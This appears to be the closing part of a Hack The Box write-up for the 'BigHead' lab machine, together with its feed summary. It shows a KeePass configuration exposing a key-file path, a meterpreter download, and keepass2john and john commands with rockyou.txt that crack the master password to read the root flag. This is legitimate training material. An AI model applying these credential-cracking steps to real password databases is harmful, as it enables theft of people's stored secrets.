		&lt;span class=&quot;nt&quot;&gt;&amp;lt;Y&amp;gt;&lt;/span&gt;2&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Y&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;Width&amp;gt;&lt;/span&gt;638&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Width&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;Height&amp;gt;&lt;/span&gt;450&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Height&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;SplitterHorizontalFrac&amp;gt;&lt;/span&gt;0.8333&lt;span class=&quot;nt&quot;&gt;&amp;lt;/SplitterHorizontalFrac&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;SplitterVerticalFrac&amp;gt;&lt;/span&gt;0.25&lt;span class=&quot;nt&quot;&gt;&amp;lt;/SplitterVerticalFrac&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;Layout&amp;gt;&lt;/span&gt;Default&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Layout&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;ToolBar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;EntryView&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;TanView&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;EntryListColumnCollection&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Column&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Type&amp;gt;&lt;/span&gt;Title&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Type&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Width&amp;gt;&lt;/span&gt;90&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Width&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Column&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Column&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Type&amp;gt;&lt;/span&gt;UserName&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Type&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Width&amp;gt;&lt;/span&gt;90&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Width&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Column&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Column&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Type&amp;gt;&lt;/span&gt;Password&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Type&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Width&amp;gt;&lt;/span&gt;90&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Width&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;HideWithAsterisks&amp;gt;&lt;/span&gt;true&lt;span class=&quot;nt&quot;&gt;&amp;lt;/HideWithAsterisks&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Column&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Column&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Type&amp;gt;&lt;/span&gt;Url&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Type&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Width&amp;gt;&lt;/span&gt;90&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Width&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Column&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Column&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Type&amp;gt;&lt;/span&gt;Notes&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Type&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Width&amp;gt;&lt;/span&gt;90&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Width&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Column&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/EntryListColumnCollection&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;EntryListColumnDisplayOrder&amp;gt;&lt;/span&gt;0 1 2 3 4&lt;span class=&quot;nt&quot;&gt;&amp;lt;/EntryListColumnDisplayOrder&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;ListSorting&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Order&amp;gt;&lt;/span&gt;Ascending&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Order&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ListSorting&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/MainWindow&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;UI&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;TrayIcon&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;Hiding&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;StandardFont&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Family&amp;gt;&lt;/span&gt;Microsoft Sans Serif&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Family&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Size&amp;gt;&lt;/span&gt;8.25&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Size&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;GraphicsUnit&amp;gt;&lt;/span&gt;Point&lt;span class=&quot;nt&quot;&gt;&amp;lt;/GraphicsUnit&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Style&amp;gt;&lt;/span&gt;Regular&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Style&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;OverrideUIDefault&amp;gt;&lt;/span&gt;false&lt;span class=&quot;nt&quot;&gt;&amp;lt;/OverrideUIDefault&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/StandardFont&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;PasswordFont&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Family&amp;gt;&lt;/span&gt;Courier New&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Family&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Size&amp;gt;&lt;/span&gt;8.25&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Size&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;GraphicsUnit&amp;gt;&lt;/span&gt;Point&lt;span class=&quot;nt&quot;&gt;&amp;lt;/GraphicsUnit&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Style&amp;gt;&lt;/span&gt;Regular&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Style&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;OverrideUIDefault&amp;gt;&lt;/span&gt;false&lt;span class=&quot;nt&quot;&gt;&amp;lt;/OverrideUIDefault&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/PasswordFont&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;BannerStyle&amp;gt;&lt;/span&gt;WinVistaBlack&lt;span class=&quot;nt&quot;&gt;&amp;lt;/BannerStyle&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;DataEditorFont&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Family&amp;gt;&lt;/span&gt;Microsoft Sans Serif&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Family&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Size&amp;gt;&lt;/span&gt;8.25&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Size&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;GraphicsUnit&amp;gt;&lt;/span&gt;Point&lt;span class=&quot;nt&quot;&gt;&amp;lt;/GraphicsUnit&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Style&amp;gt;&lt;/span&gt;Regular&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Style&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;OverrideUIDefault&amp;gt;&lt;/span&gt;false&lt;span class=&quot;nt&quot;&gt;&amp;lt;/OverrideUIDefault&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/DataEditorFont&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;UIFlags&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/UIFlags&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;KeyCreationFlags&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/KeyCreationFlags&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;KeyPromptFlags&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/KeyPromptFlags&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/UI&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;Security&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;WorkspaceLocking&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;LockAfterTime&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LockAfterTime&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;LockAfterGlobalTime&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LockAfterGlobalTime&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/WorkspaceLocking&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;Policy&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;MasterPassword&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;MinimumLength&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/MinimumLength&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;MinimumQuality&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/MinimumQuality&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/MasterPassword&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Security&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;Native&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;PasswordGenerator&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;AutoGeneratedPasswordsProfile&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;GeneratorType&amp;gt;&lt;/span&gt;CharSet&lt;span class=&quot;nt&quot;&gt;&amp;lt;/GeneratorType&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Length&amp;gt;&lt;/span&gt;20&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Length&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;CharSetRanges&amp;gt;&lt;/span&gt;ULD_______&lt;span class=&quot;nt&quot;&gt;&amp;lt;/CharSetRanges&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/AutoGeneratedPasswordsProfile&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;LastUsedProfile&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;GeneratorType&amp;gt;&lt;/span&gt;CharSet&lt;span class=&quot;nt&quot;&gt;&amp;lt;/GeneratorType&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Length&amp;gt;&lt;/span&gt;20&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Length&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;CharSetRanges&amp;gt;&lt;/span&gt;ULD_______&lt;span class=&quot;nt&quot;&gt;&amp;lt;/CharSetRanges&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LastUsedProfile&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;UserProfiles&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/PasswordGenerator&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;Defaults&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;OptionsTabIndex&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/OptionsTabIndex&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;SearchParameters&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;ComparisonMode&amp;gt;&lt;/span&gt;InvariantCultureIgnoreCase&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ComparisonMode&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/SearchParameters&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;KeySources&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Association&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;DatabasePath&amp;gt;&lt;/span&gt;..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier&lt;span class=&quot;nt&quot;&gt;&amp;lt;/DatabasePath&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;Password&amp;gt;&lt;/span&gt;true&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Password&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;KeyFilePath&amp;gt;&lt;/span&gt;..\..\Users\Administrator\Pictures\admin.png&lt;span class=&quot;nt&quot;&gt;&amp;lt;/KeyFilePath&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Association&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/KeySources&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Defaults&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;Integration&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;HotKeyGlobalAutoType&amp;gt;&lt;/span&gt;393281&lt;span class=&quot;nt&quot;&gt;&amp;lt;/HotKeyGlobalAutoType:&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;HotKeySelectedAutoType&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/HotKeySelectedAutoType&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;HotKeyShowWindow&amp;gt;&lt;/span&gt;393291&lt;span class=&quot;nt&quot;&gt;&amp;lt;/HotKeyShowWindow&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;HotKeyEntryMenu&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/HotKeyEntryMenu&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;UrlSchemeOverrides&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;BuiltInOverridesEnabled&amp;gt;&lt;/span&gt;1&lt;span class=&quot;nt&quot;&gt;&amp;lt;/BuiltInOverridesEnabled&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;CustomOverrides&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/UrlSchemeOverrides&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;AutoTypeAbortOnWindows&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;ProxyType&amp;gt;&lt;/span&gt;System&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ProxyType&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;ProxyAuthType&amp;gt;&lt;/span&gt;Auto&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ProxyAuthType&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Integration&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;Custom&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Configuration&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;exactly-here-&quot;&gt;Exactly here :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/147.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-key-is-adminpng-in-cusersadministratorpictures-lets-download-it-&quot;&gt;The key is &lt;code class=&quot;highlighter-rouge&quot;&gt;admin.png&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Administrator\Pictures\&lt;/code&gt;. Let’s download it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/148.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;adminpng-&quot;&gt;admin.png :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/admin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-wanted-to-test-the-key-we-still-need-the-password-&quot;&gt;I wanted to test the key (we still need the password) :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/149.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/150.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-expected-the-composite-key-is-invalid-but-instead-of-that-i-got-the-file-version-is-unsupported-i-tried-many-other-version-of-keepass-and-got-the-same-error-so-i-was-sure-that-the-file-itself-was-corrupted-maybe-because-of-more-i-downloaded-it-again-with-meterpreter-itself-this-time-&quot;&gt;I expected &lt;code class=&quot;highlighter-rouge&quot;&gt;The composite key is invalid&lt;/code&gt; but instead of that I got &lt;code class=&quot;highlighter-rouge&quot;&gt;The file version is unsupported&lt;/code&gt;. I tried many other version of &lt;code class=&quot;highlighter-rouge&quot;&gt;keepass&lt;/code&gt; and got the same error. So I was sure that the file itself was corrupted (maybe because of &lt;code class=&quot;highlighter-rouge&quot;&gt;more&lt;/code&gt;). I downloaded it again with &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; itself this time :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/151.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-renamed-it-to-dbkdbx-&quot;&gt;Then I renamed it to &lt;code class=&quot;highlighter-rouge&quot;&gt;db.kdbx&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/152.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-try-again-&quot;&gt;Let’s try again :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/153.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/154.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;perfect--now-we-need-the-password-i-used-keepass2john-to-put-the-kdbx-file-in-a-john-crackable-format-we-need-the-key-to-do-that-adminpng&quot;&gt;Perfect ! Now we need the password. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;keepass2john&lt;/code&gt; to put the &lt;code class=&quot;highlighter-rouge&quot;&gt;kdbx&lt;/code&gt; file in a &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; crackable format (we need the key to do that (&lt;code class=&quot;highlighter-rouge&quot;&gt;admin.png&lt;/code&gt;))&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;keepass2john -k admin.png &amp;gt; db.john&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/155.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-used-john-with-rockyoutxt-to-crack-it-&quot;&gt;Then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; to crack it :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;john --wordlist=/usr/share/wordlists/rockyou.txt db.john&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/156.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-password-is-darkness-lets-try-to-open-the-database-&quot;&gt;The password is &lt;code class=&quot;highlighter-rouge&quot;&gt;darkness&lt;/code&gt;. Let’s try to open the database :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/157.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/158.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great--double-click-on-roottxt-and-it-will-copy-the-flag-into-our-clipboard-&quot;&gt;Great ! double-click on &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; and it will copy the flag into our clipboard :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/159.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-paste-it-&quot;&gt;Let’s paste it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/160.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-finally-we-can-say--we-owned-root-&quot;&gt;And finally we can say … We owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---irked&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/irked/&quot;&gt;Hack The Box - Irked&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---lightweight&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/lightweight/&quot;&gt;Hack The Box - Lightweight&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Web" /><category term="Reverse Engineering" /><category term="egghunting" /><category term="Buffer Overflow" /><category term="Windows Exploitation" /><category term="Exploit Development" /><category term="LFI" /><category term="RCE" /><category term="Forensics" /><category term="Networking" /><category term="Pivoting" /><category term="ssh" /><category term="code analysis" /><category term="Python" /><category term="php" /><summary type="html">Quick Summary Hey guys, Today BigHead retired and here’s my write-up about it. As you can see it’s an insane box, actually it’s hard to summarize this box as it included a lot of steps to achieve different goals. Most of the steps require deep enumeration especially the initial foothold. The part I liked the most about this box is the win32 buffer overflow egghunting exploitation as it was very interesting. The whole box was challenging and the overall experience wasn’t bad, But I disliked the fact that it had a lot of trolls. I found it kinda funny that the box had a lot of Silicon Valley references :D even the name of the box is the name of one of the characters, Anyway let’s not waste more time. It’s a windows box and its ip is 10.10.10.112. I added it to /etc/hosts as bighead.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC bighead.htb Only one port is open which is port 80 and it’s running http. Let’s take a look. HTTP Enumeration It’s a website titled PiperNet Comes. The background is an image of the characters from the TV show “Silicon Valley”, and in the middle it’s saying PIPERNET IS HERE. Also there are two links down there, First one is THIS IS PIPERNET which is the homepage and the other one is PIEDPIPERCOIN. Let’s scroll down and see what else do we have : PIEDPIPERCOIN COMES, and there’s a small description of what piedpipercoin is. After that there are some pictures for the characters from “Silicon Valley” and some stuff about each one of them, Nothing is interesting so far. At the bottom of the page there is this contact form : I looked at the contact info and I noticed that the email was info@bachmanity.htb. Let’s check that domain, but before doing that I wanted to check the other page PIEDPIPERCOIN : Instead of PIEDPIPERCOIN COMES it’s saying PIEDPIPERCOIN CAME but nothing is interesting. Let’s check bachmanity.htb, we need to add it to /etc/hosts first : bachmanity.htb It’s only that image and nothing else : Back to the contact form, I wanted to see if it’s exploitable in any way. I filled all the fields with test : It sends the request to mailer.bighead.htb, Let’s add it to /etc/hosts and try again : It shows this message then it redirects the browser back to bighead.htb. I also intercepted the request with burp : Tried to manipulate the input, but couldn’t achieve anything. I went to mailer.bighead.htb and got redirected to mailer.bighead.htb/testlink which shows this error : In the background I ran gobuster on bachmanity.htb and bighead.htb with /usr/share/wordlists/dirb/common.txt. bachmanity.htb didn’t have anything : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://bachmanity.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:21:01 Starting gobuster ===================================================== /index.html (Status: 200) /index.htm (Status: 200) but bighead.htb gave some results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://bighead.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 